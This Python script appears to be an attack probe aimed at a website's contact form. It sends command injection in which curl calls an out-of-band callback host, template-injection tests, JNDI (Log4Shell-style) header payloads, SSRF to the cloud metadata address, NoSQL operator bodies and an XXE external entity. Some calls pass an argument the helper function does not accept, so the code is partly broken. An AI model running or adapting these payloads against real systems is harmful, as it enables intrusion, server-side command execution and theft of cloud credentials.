import sys, time, subprocess
sys.path.insert(0,".")
from ic import post, build, HOST, UA

SSRF = "oob3bc2cb690cba.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
XXE  = "oob405d6f4396bd.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"

def raw(label, body, ctype="application/x-www-form-urlencoded", tries=8):
    code, hdr, bd, n = post(None, raw=body, ctype=ctype, tries=tries)
    print("%-42s HTTP %-4s %s" % (label, code, bd[:180].replace("\n"," ")))

base = "fname=Test&lname=User&areacode=973&tel=1234567&cname=QA&subject=S&check=on"

print("=== CMDi / template / SSTI in fields ===")
raw("cmd-injection msg", base+"&msg=x%3Bcurl+http%3A%2F%2F"+SSRF.replace(".", "%2E")+"%2Fcmdi%3B")
raw("cmd-injection subj", base+"&subject=%24(curl+http%3A%2F%2F"+SSRF.replace(".","%2E")+"%2Fcmdi2)&msg=hello")
raw("SSTI msg {{7*7}}", base+"&msg=%7B%7B7*7%7D%7D")
raw("SSTI msg ${7*7}", base+"&msg=%24%7B7*7%7D")
raw("SSTI cname <%=7*7%>", base+"&msg=m&cname=%3C%25%3D7*7%25%3E")
raw("JNDI User-Agent", base+"&msg=m", extra=["-H","User-Agent: ${jndi:ldap://"+SSRF+"/j}"])
raw("JNDI X-Forwarded-For", base+"&msg=m", extra=["-H","X-Forwarded-For: ${jndi:ldap://"+SSRF+"/j2}"])

print()
print("=== SSRF in targets (the mail 'to' field) ===")
raw("targets=http://oob", base+"&msg=m&targets=http%3A%2F%2F"+SSRF.replace(".","%2E")+"%2Fssrf")
raw("targets=metadata", base+"&msg=m&targets=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F")

print()
print("=== NoSQL / JSON operator bodies ===")
import json
raw("json body targets $ne", json.dumps({"fname":"T","msg":"m","targets":{"$ne":None}}), ctype="application/json")
raw("json body $gt", json.dumps({"fname":"T","msg":"m","targets":{"$gt":""}}), ctype="application/json")

print()
print("=== XXE ===")
xml = ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://'+XXE+'/xxe">]>'
       '<r><fname>&x;</fname><msg>m</msg><targets>1</targets></r>')
raw("xml body XXE", xml, ctype="application/xml")
raw("xml body XXE (text/xml)", xml.replace("application/xml","text/xml"), ctype="text/xml")
